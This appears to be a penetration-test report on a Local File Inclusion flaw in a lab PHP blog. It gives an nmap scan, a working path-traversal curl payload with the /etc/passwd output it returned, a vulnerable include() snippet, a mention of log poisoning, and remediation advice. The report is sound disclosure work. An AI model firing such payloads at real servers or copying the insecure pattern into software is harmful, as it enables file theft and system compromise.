# Report

**Generated:** 2025-08-11 22:41:19
**Session ID:** 7729a26d9c044b758c6998403c5d8e6e

---

## Web Vulnerability Report: Local File Inclusion

---

1.  **Title**
    Local File Inclusion on `index.php` Allows Arbitrary File Read and Potential Remote Code Execution (High Severity)

2.  **Description and Impact**
    The "Techno Beat Blog" web application, hosted at `http://192.168.2.0`, is vulnerable to Local File Inclusion (LFI) through the `page` parameter of its `index.php` endpoint. This vulnerability allows an attacker to include and display the contents of arbitrary files from the server's file system, bypassing intended access restrictions. The application appears to be a PHP-based blog, and the vulnerability was identified on `index.php` when processing the `page` GET parameter (e.g., `index.php?page=page1.php`).

    The immediate impact of this LFI vulnerability is severe information disclosure. An attacker can read sensitive system files (such as `/etc/passwd`, `/etc/shadow`, configuration files, web server logs, or application source code), which can reveal critical system information, user credentials, database connection strings, or other proprietary data. For instance, the successful retrieval of `/etc/passwd` during testing confirmed the ability to enumerate system users and their home directories. Beyond information disclosure, LFI can often be leveraged to achieve Remote Code Execution (RCE) by combining it with other techniques, such as log poisoning (injecting malicious code into web server logs and then including the log file) or by including files that allow for code execution (e.g., session files, uploaded files). This could lead to full system compromise, data exfiltration, or defacement of the web application. The affected platform is a Linux-based web server running a PHP application.

3.  **Root Cause Analysis**
    The root cause of the Local File Inclusion vulnerability lies in the application's insecure handling of user-supplied input for file inclusion operations. Specifically, the `index.php` script directly concatenates the value of the `page` GET parameter into a file path without sufficient validation or sanitization. This allows an attacker to use directory traversal sequences (e.g., `../`, `..\`) to navigate outside the intended directory and access files located elsewhere on the server's file system.

    A common programming pattern leading to this vulnerability in PHP applications is similar to:
    ```php
    <?php
    // Insecure code snippet (example of root cause)
    $page = $_GET['page'];
    include($page); // No sanitization or path validation
    ?>
    ```
    In this scenario, if an attacker provides `../../../../etc/passwd` as the value for `$page`, the `include()` function will attempt to load and display the contents of `/etc/passwd`, rather than restricting file access to a specific, intended directory. The application fails to implement a whitelist of allowed files, strip directory traversal characters, or enforce a strict base directory for file inclusions.

4.  **Steps to Reproduce**
    The Local File Inclusion vulnerability can be reproduced by following these steps:

    1.  **Identify Target and Parameter:**
        *   Perform Nmap scan to confirm `192.168.2.0` is a live host with port 80 open.
        *   `nmap -T5 -p 80 192.168.2.0`
        *   Use `curl` to enumerate the web application and identify the `page` parameter:
        *   `curl http://192.168.2.0/index.php`
        *   Observe the application structure, indicating `index.php?page=somefile.php`.

    2.  **Exploit LFI to Read `/etc/passwd`:**
        *   Execute the following `curl` command to attempt to read the `/etc/passwd` file:
            ```bash
            curl "http://192.168.2.0/index.php?page=../../../../etc/passwd"
            ```
            *Note: The quotes around the URL are important to prevent shell interpretation of special characters.*

    3.  **Verify Output:**
        *   Observe the `curl` output. The response will include the full content of the `/etc/passwd` file embedded within the HTML of the "Techno Beat Blog" page.
        *   Example snippet from expected output:
            ```html
            <!-- ... other HTML content ... -->
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
            <!-- ... rest of /etc/passwd and HTML content ... -->
            ```
        This successful retrieval confirms the presence and exploitability of the Local File Inclusion vulnerability.

5.  **Attachments**
    *   **Curl Output (demonstrating `/etc/passwd` retrieval):** The `curl` command output showing the contents of `/etc/passwd` embedded within the HTML response.
    *   **Penetration Testing Process Summary:** Detailed steps of reconnaissance, host discovery, web application enumeration, and the specific LFI exploitation attempt.
    *   **Current Shell Status:** Confirmation that LFI was successful for file reading, but direct shell access has not yet been established.

6.  **Recommendations**
    To remediate the Local File Inclusion vulnerability and prevent similar path traversal attacks, the following recommendations should be implemented:

    **Immediate Fixes:**
    *   **Input Validation and Sanitization:** Implement strict validation for the `page` parameter. Instead of directly including the user-supplied value, consider a whitelist approach where only a predefined set of allowed file names can be included.
    *   **Path Traversal Prevention:** Explicitly strip or disallow directory traversal sequences (`../`, `..\`) from user input before it is used in file path operations. Functions like `realpath()` or `basename()` can help, but should be used carefully in conjunction with other validation.
    *   **Secure File Inclusion Logic:** Ensure that all file inclusion operations are restricted to a specific, hardcoded directory. For example, prepend a fixed base path to the validated filename: `include('/var/www/html/pages/' . $validated_page_name);`.

    **Long-term Hardening and Best Practices:**
    *   **Principle of Least Privilege:** Configure the web server and application to run with the minimum necessary privileges to reduce the impact of a successful compromise.
    *   **Web Application Firewall (WAF):** Deploy a WAF to detect and block common web attack patterns, including path traversal attempts.
    *   **Secure Coding Practices:** Educate developers on secure coding principles, particularly regarding input validation, file handling, and the dangers of direct user input concatenation in file paths.
    *   **Error Handling:** Implement robust error handling that does not reveal sensitive information (e.g., full file paths, database errors) to attackers.
    *   **Regular Security Audits:** Conduct periodic security audits and penetration tests to identify and remediate new or recurring vulnerabilities.

7.  **References**
    *   **OWASP Top 10 2021 - A03:2021-Injection:** [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
    *   **OWASP Local File Inclusion:** [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
    *   **CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'):** [https://cwe.mitre.org/data/definitions/22.html](https://cwe.mitre.org/data/definitions/22.html)